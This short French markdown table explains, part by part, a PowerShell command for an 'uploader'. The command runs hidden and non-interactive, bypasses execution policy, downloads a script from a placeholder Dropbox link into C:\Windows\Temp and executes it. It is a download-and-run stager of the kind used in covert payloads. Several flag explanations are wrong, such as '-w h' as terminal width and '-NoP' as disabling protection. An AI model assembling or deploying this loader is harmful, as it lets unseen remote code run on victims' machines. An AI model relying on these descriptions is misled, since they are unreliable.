# Paramètres et description de l'uploader

| Paramètre         | Description |
| ----------------- | ----------- |
| `powershell`      | Commande pour lancer Windows PowerShell |
| `-w h`            | Définit la largeur du terminal à une hauteur maximale |
| `-NoP`            | Désactive la protection du script |
| `-NonI`           | Désactive les interactions de l'interface utilisateur |
| `-Exec Bypass`    | Autorise l'exécution de scripts non signés |
| `iwr`             | Alias pour Invoke-WebRequest pour télécharger le fichier |
| `https://www.dropbox.com/s/yourshare_url?dl=1` | URL pour télécharger le fichier script |
| `-o "c:\windows\temp\your_script_name.ps1"` | Spécifie l'emplacement où le fichier script doit être enregistré |
| `invoke-expression` | Exécute un script PowerShell |
| `"c:\windows\temp\your_script_name.ps1"` | Emplacement du fichier script téléchargé |
